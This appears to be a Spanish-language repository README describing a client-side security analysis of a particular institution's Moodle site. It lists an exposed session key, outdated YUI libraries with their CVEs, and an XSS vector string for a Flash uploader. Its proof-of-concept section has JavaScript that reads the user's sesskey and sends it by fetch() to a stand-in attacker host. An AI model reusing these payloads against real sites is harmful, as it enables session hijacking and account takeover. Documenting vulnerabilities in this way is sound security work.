# 🛡️ CyberSecurity Research Repository

<div align="center">

![Banner](https://img.shields.io/badge/Security%20Research-Análisis%20de%20Vulnerabilidades-blueviolet?style=for-the-badge&logo=shield)
![Moodle](https://img.shields.io/badge/Plataforma-Moodle%20CUN-red?style=flat-square&logo=book)
![Status](https://img.shields.io/badge/Estado-Activo-brightgreen?style=flat-square)

**Análizando, documentando y protegiendo.** 🔍

</div>

---

## 📋 Sobre Este Proyecto

Análisis de seguridad realizado sobre una plataforma **Moodle** de la institución ******N**, centrado en el estudio del código HTML/JavaScript del lado del cliente. Este proyecto documenta vulnerabilidades potenciales, vectores de ataque y recomendaciones de mitigación.

> ⚠️ **Nota:** Este análisis fue realizado con fines educativos y de investigación en seguridad ofensiva.

---

## 🚨 Vulnerabilidades Identificadas

### 1. Exposición de Información Sensible ⚠️

| Dato Expuesto | Riesgo |
|---------------|--------|
| `userId: *******5` | Identificador único de base de datos |
| `sesskey: "*****B"` | **CRÍTICO** - Token de sesión vulnerable a XSS |

```
📌 Impacto: Si un atacante logra ejecutar scripts en el navegador del usuario, 
puede secuestrar la sesión, cambiar contraseñas o modificar matriculas.
```

### 2. Librerías Obsoletas 🔴

```
Versión            Estado        Riesgo
─────────────────────────────────────────
YUI 2.9.0       ⚠️ EOL (2014)     ALTO
YUI 3.18.1      ⚠️ EOL (2014)     MODERADO
```

**CVEs asociadas (YUI 2.9.0):**

- 🔴 **CVE-2012-5881, CVE-2012-5882, CVE-2012-5883** — XSS mediante archivos Flash (.swf)
- 🔴 **CVE-2013-6780** — XSS en componente Uploader
- 🟡 **CVE-2010-4710** — XSS en Widget de Menú

### 3. Riesgo de Cross-Site Scripting (XSS) 🔴

```javascript
// Vector de ataque posible
uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert(1)}//
```

### 4. Configuración de Seguridad Ausente

- ❌ Sin **CSP** (Content Security Policy)
- ❌ Posible carga de recursos mixtos
- ❌ Posibles configuraciones CORS débiles
- ❌ Encabezados de seguridad no visibles

### 5. Enumeración de Directorios 🟡

```
📁 Rutas expuestas:
├── /theme/moove/         (tema activo)
├── /lib/yuilib/          (librería YUI)
└── /pluginfile.php/      (gestión de archivos)
```

---

## ⚡ Proof of Concept (PoC)

```javascript
// Extracción de datos sensibles mediante XSS
(function() {
    var info = "User ID: " + M.cfg.userId + "\nSessKey: " + M.cfg.sesskey;
    alert("Información capturada:\n" + info);
})();

// Envío de sesskey a servidor externo
fetch("https://atacante.com/exfiltrar?sesskey=" + M.cfg.sesskey);
```

### Herramientas de Automatización

| Herramienta | Uso |
|-------------|-----|
| 🟡 **Burp Suite** | Interceptar y buscar `M.cfg` en HTTP history |
| 🐍 **Python + Selenium** | Extraer config automáticamente |
| 🔍 **Nessus/Snyk** | Escaneo de vulnerabilidades已知 |

---

## 🔐 Impacto de Seguridad

```
Secuestro de sesión     ████████████████ 100%
Phishing                ████████████      80%
Acciones no autorizadas ████████████████ 100%
```

---
